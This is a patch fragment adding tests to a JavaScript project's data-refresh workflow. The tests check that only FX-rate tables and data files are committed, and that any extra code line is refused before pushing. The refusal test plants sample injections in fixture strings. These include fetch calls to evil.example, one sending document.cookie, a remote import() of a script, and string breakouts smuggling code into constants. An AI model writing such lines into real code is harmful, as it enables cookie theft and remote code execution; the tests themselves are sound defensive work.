+-  const writers = new Set(['data/freshness.json', 'docs/DATA_FRESHNESS.md', ...literal, ...FX_CODE_COPIES.map((c) => c.file), SHARED_FALLBACK_FILE, LIVABILITY, TAX_FILE]);
++  assert.ok(sites >= 6, `${sites} write sites`);
+   const step = stepScript('Commit the tested data');
+-  const allow = /\n {4}([^\n]*\|test\/juice\.test\.js)\) ;;/.exec(`\n${step}`)?.[1].trim().split('|') || [];
++  const allow = /\n {4}\s*(data\/freshness\.json\|[^\n]*)\) ;;/.exec(`\n${step}`)?.[1].trim().split('|') || [];
+   assert.deepEqual(new Set(allow), writers, `allow-list ${allow.join(', ')}`);
++  assert.deepEqual(allow.filter((f) => f.startsWith('test/')), [], 'the refresh never commits test code');
++  assert.deepEqual(allow.filter((f) => f.endsWith('.js')).sort(), [...FX_CODE_FILES].sort(), 'the only code it commits is the FX copies, which the step checks line by line');
++});
++
++/* ------------------------------------------------- S-9 residual (fix-sec-3) */
++
++const FX9 = JSON.parse(fs.readFileSync(path.join(ROOT, 'test', 'fixtures', 'refresh', 'fx-refresh-9de373f.json'), 'utf8'));
++const CODE = Object.keys(FX9.files);
++const before = Object.fromEntries(CODE.map((f) => [f, FX9.files[f].before]));
++const after = Object.fromEntries(CODE.map((f) => [f, FX9.files[f].after]));
++
++test('S-9 residual: the first real refresh (9de373f) passes: its FX code-copy changes are committed and deployed', () => {
++  assert.deepEqual(CODE.sort(), ['public/features/shared.js', 'public/viz/palette.js', 'server/juice.js', 'server/salary.js']);
++  const t = setup({ files: ['data/cities.json', ...CODE], seed: before, changes: after });
++  assert.equal(t.r.status, 0, t.r.stdout + t.r.stderr);
++  for (const f of CODE) assert.equal(t.show(f), after[f].trim(), f);
++  assert.equal(t.show('data/cities.json'), 'refreshed data/cities.json');
++  assert.match(t.gh, /pages\.yml/);
++  done(t);
++});
++
++test('S-9 residual: a code line outside the FX table is refused, and nothing is pushed', () => {
++  const swap = (f, a, b) => { assert.ok(after[f].includes(a), `${f}: ${a}`); return { ...after, [f]: after[f].replace(a, b) }; };
++  const cases = {
++    'a line after the table': swap('server/juice.js', 'export const FX_TO_USD = Object.freeze(Object.fromEntries(', "export const FX_TO_USD = (globalThis.fetch?.('https://evil.example/?' + document.cookie), Object.freeze(Object.fromEntries("),
++    'a table row turned into code': swap('public/viz/palette.js', '  GBP: 0.745338,', "  GBP: (fetch('//evil.example'), 0.745338),"),
++    'a row added to the table': swap('server/salary.js', '  USD: 1,\n', '  USD: 1,\n  EVL: 1,\n'),
++    'FX_SOURCE breaking out of its string': swap('server/juice.js', "export const FX_SOURCE = 'ECB", "export const FX_SOURCE = ''; fetch('//evil.example'); const x = 'ECB"),
++    'a line added below the fallback': swap('public/features/shared.js', 'CNY: 0.1491 });', "CNY: 0.1491 });\nimport('https://evil.example/x.js');"),
++    'the table closed early': swap('server/salary.js', '  TWD: 31.7381,\n', '});\nfetch("//evil.example");\nconst Z = Object.freeze({\n'),
++  };
++  for (const [name, changes] of Object.entries(cases)) {
++    const t = setup({ files: ['data/cities.json', ...CODE], seed: before, changes });
++    assert.notEqual(t.r.status, 0, `${name}: committed`);
++    assert.match(t.r.stdout + t.r.stderr, /changes more than an FX value/, name);
++    for (const f of CODE) assert.equal(t.show(f), before[f].trim(), `${name}: ${f} was pushed`);
++    assert.equal(t.show('data/cities.json'), 'old data/cities.json', `${name}: the data was pushed`);
++    assert.equal(t.gh, '', name);
++    done(t);
++  }
+ });
+-- 
+2.43.0
+
